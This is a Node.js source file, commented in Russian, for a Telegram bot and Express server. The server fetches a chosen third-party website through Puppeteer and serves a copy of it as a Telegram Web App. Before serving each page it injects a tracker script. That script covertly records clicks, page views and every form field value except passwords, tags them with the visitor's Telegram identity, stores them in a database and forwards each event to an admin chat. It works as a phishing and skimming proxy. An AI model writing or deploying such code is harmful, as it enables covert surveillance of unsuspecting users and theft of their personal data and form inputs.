require('dotenv').config();
const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { Pool } = require('pg');
const puppeteer = require('puppeteer');

const app = express();
app.use(express.json());

// Database
const pool = new Pool({ connectionString: process.env.DATABASE_URL });

// Telegram Bot
const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
const ADMIN_ID = process.env.ADMIN_CHAT_ID;
const TARGET_SITE = process.env.TARGET_SITE || 'https://example.com';
const PROXY_URL = process.env.PROXY_URL;

// Браузер
let browser = null;

async function getBrowser() {
  if (!browser) {
    const args = [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-dev-shm-usage',
      '--disable-gpu',
      '--single-process',
      '--disable-web-security'
    ];
    
    // Only add proxy if explicitly set and valid
    if (PROXY_URL && PROXY_URL.trim()) {
      console.log('Using proxy:', PROXY_URL);
      args.push(`--proxy-server=${PROXY_URL}`);
    } else {
      console.log('No proxy configured');
    }
    
    try {
      browser = await puppeteer.launch({
        headless: 'new',
        executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || undefined,
        args,
        protocolTimeout: 60000, // 60 секунд
        timeout: 60000
      });
    } catch (err) {
      console.error('Failed to launch browser with current config:', err.message);
      // Retry without proxy if it failed
      if (PROXY_URL) {
        console.log('Retrying without proxy...');
        const argsNoProxy = args.filter(arg => !arg.startsWith('--proxy-server='));
        browser = await puppeteer.launch({
          headless: 'new',
          executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || undefined,
          args: argsNoProxy,
          protocolTimeout: 60000,
          timeout: 60000
        });
      } else {
        throw err;
      }
    }
  }
  return browser;
}

// Инициализация БД
async function initDB() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS logs (
      id SERIAL PRIMARY KEY,
      session_id VARCHAR(255),
      telegram_user JSONB,
      event_type VARCHAR(50),
      element VARCHAR(255),
      value TEXT,
      page_url TEXT,
      created_at TIMESTAMP DEFAULT NOW()
    )
  `);
}
initDB();

// Трекер скрипт
const trackerScript = `
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<script>
(function() {
  const tg = window.Telegram?.WebApp;
  if (tg) { tg.ready(); tg.expand(); }
  const telegramUser = tg?.initDataUnsafe?.user || null;
  const sessionId = 'sess_' + Math.random().toString(36).substr(2, 9);
  
  function sendLog(eventType, element, value) {
    fetch('/api/log', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ sessionId, telegramUser, eventType, element, value: value || '', pageUrl: location.href })
    }).catch(() => {});
  }
  
  sendLog('pageview', document.title || location.pathname);
  
  document.addEventListener('click', (e) => {
    const el = e.target;
    const tag = el.tagName.toLowerCase();
    const text = el.innerText?.slice(0, 50) || '';
    const id = el.id ? '#' + el.id : '';
    const cls = el.className && typeof el.className === 'string' ? '.' + el.className.split(' ')[0] : '';
    sendLog('click', tag + id + cls, text);
  });
  
  document.addEventListener('change', (e) => {
    const el = e.target;
    if (['INPUT','TEXTAREA','SELECT'].includes(el.tagName)) {
      const name = el.name || el.id || el.placeholder || 'field';
      const val = el.type === 'password' ? '***' : el.value;
      sendLog('input', name, val);
    }
  });
  
  document.addEventListener('submit', (e) => {
    sendLog('submit', e.target.name || e.target.id || 'form');
  });
})();
</script>
`;

// API логирования
app.post('/api/log', async (req, res) => {
  const { sessionId, telegramUser, eventType, element, value, pageUrl } = req.body;
  
  try {
    await pool.query(
      'INSERT INTO logs (session_id, telegram_user, event_type, element, value, page_url) VALUES ($1, $2, $3, $4, $5, $6)',
      [sessionId, JSON.stringify(telegramUser), eventType, element, value, pageUrl]
    );
    
    const icons = { click: '👆', input: '⌨️', submit: '📤', pageview: '👁️' };
    const icon = icons[eventType] || '📝';
    const user = telegramUser?.username ? '@' + telegramUser.username : telegramUser?.id || 'Аноним';
    
    let msg = icon + ' ' + eventType.toUpperCase() + '\n';
    msg += '👤 ' + user + '\n';
    msg += '🎯 ' + element + '\n';
    if (value) msg += '📝 ' + value + '\n';
    msg += '🔗 ' + pageUrl;
    
    await bot.sendMessage(ADMIN_ID, msg);
    res.json({ ok: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Error' });
  }
});

// Прокси через Puppeteer
app.get('*', async (req, res) => {
  const url = TARGET_SITE + req.path + (req.url.includes('?') ? req.url.substring(req.url.indexOf('?')) : '');
  console.log('Fetching with Puppeteer:', url);
  
  let page = null;
  try {
    const br = await getBrowser();
    page = await br.newPage();
    
    // Увеличиваем таймауты
    page.setDefaultTimeout(60000);
    page.setDefaultNavigationTimeout(60000);
    
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
    await page.setViewport({ width: 1920, height: 1080 });
    
    await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 60000 });
    
    // Ждём прохождения Cloudflare (до 15 сек)
    await page.waitForFunction(() => !document.title.includes('Just a moment'), { timeout: 15000 }).catch(() => {});
    
    let html = await page.content();
    
    // Внедряем трекер
    if (html.includes('</body>')) {
      html = html.replace('</body>', trackerScript + '</body>');
    } else {
      html += trackerScript;
    }
    
    res.setHeader('Content-Type', 'text/html');
    res.send(html);
  } catch (err) {
    console.error('Puppeteer error:', err.message);
    res.status(500).send(`
      <html><body style="font-family:sans-serif;padding:20px;">
        <h2>❌ Ошибка загрузки</h2>
        <p>${err.message}</p>
      </body></html>
    `);
  } finally {
    if (page) await page.close().catch(() => {});
  }
});

// Команды бота
bot.onText(/\/start/, (msg) => {
  const webappUrl = process.env.WEBAPP_URL || 'https://your-app.railway.app';
  bot.sendMessage(msg.chat.id, '👋 Открой приложение:', {
    reply_markup: {
      inline_keyboard: [[{ text: '🚀 Открыть', web_app: { url: webappUrl } }]]
    }
  });
});

bot.onText(/\/test/, async (msg) => {
  if (msg.chat.id.toString() !== ADMIN_ID) return;
  
  bot.sendMessage(msg.chat.id, '⏳ Тестирую загрузку через Puppeteer...');
  
  let page = null;
  try {
    const br = await getBrowser();
    page = await br.newPage();
    
    // Увеличиваем таймауты
    page.setDefaultTimeout(60000);
    page.setDefaultNavigationTimeout(60000);
    
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    
    const start = Date.now();
    await page.goto(TARGET_SITE, { waitUntil: 'domcontentloaded', timeout: 60000 });
    
    // Ждём Cloudflare
    await page.waitForFunction(() => !document.title.includes('Just a moment'), { timeout: 15000 }).catch(() => {});
    
    const time = Date.now() - start;
    const title = await page.title();
    
    bot.sendMessage(msg.chat.id, 
      `✅ Успешно!\n⏱️ Время: ${time}ms\n📄 Заголовок: ${title}\n🔒 Прокси: ${PROXY_URL ? 'да' : 'нет'}`
    );
  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Ошибка: ${err.message}`);
  } finally {
    if (page) await page.close().catch(() => {});
  }
});

bot.onText(/\/logs/, async (msg) => {
  if (msg.chat.id.toString() !== ADMIN_ID) return;
  const result = await pool.query('SELECT * FROM logs ORDER BY created_at DESC LIMIT 10');
  if (!result.rows.length) return bot.sendMessage(msg.chat.id, 'Логов нет');
  let text = '📊 Последние события:\n\n';
  result.rows.forEach((l, i) => { text += (i+1) + '. ' + l.event_type + ' — ' + l.element + '\n'; });
  bot.sendMessage(msg.chat.id, text);
});

bot.onText(/\/clear/, async (msg) => {
  if (msg.chat.id.toString() !== ADMIN_ID) return;
  await pool.query('DELETE FROM logs');
  bot.sendMessage(msg.chat.id, '🗑️ Очищено');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Server on port ' + PORT));

// Закрытие браузера при выходе
process.on('SIGTERM', async () => {
  if (browser) await browser.close();
  process.exit(0);
});
